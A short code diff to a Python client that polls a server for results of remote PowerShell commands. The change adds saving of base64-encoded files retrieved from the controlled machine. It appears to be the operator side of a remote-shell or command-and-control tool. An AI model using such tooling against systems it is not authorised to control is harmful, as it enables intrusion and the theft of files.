@@ -27,9 +27,17 @@ def recv():
             resp = requests.post(SERVER_IP + '/client/recv', timeout=10)
             while resp.status_code == 204:
                 resp = requests.post(SERVER_IP + '/client/recv', timeout=10)
-            resp = resp.text
-            cd = 'PS ' + json.loads(resp)['cwd'] + '>'
-            lastest = json.loads(resp)['output'] if json.loads(resp)['output'] is not None else '\033[31m' + str(json.loads(resp)['error']) + '\033[0m'
+            resp = json.loads(resp.text)
+
+            cd = 'PS ' + resp['cwd'] + '>'
+            if 'download' in resp:
+                filename = resp['download']['filename']
+                filedata = base64.b64decode(resp['download']['filedata'])
+                with open(filename, 'wb') as f:
+                    f.write(filedata)
+                lastest = f"\033[32mDownloaded file saved as: {filename}\033[0m"
+            else:
+                lastest = resp['output'] if resp['output'] is not None else '\033[31m' + str(resp['error']) + '\033[0m'
         except requests.exceptions.ReadTimeout:
             continue
 
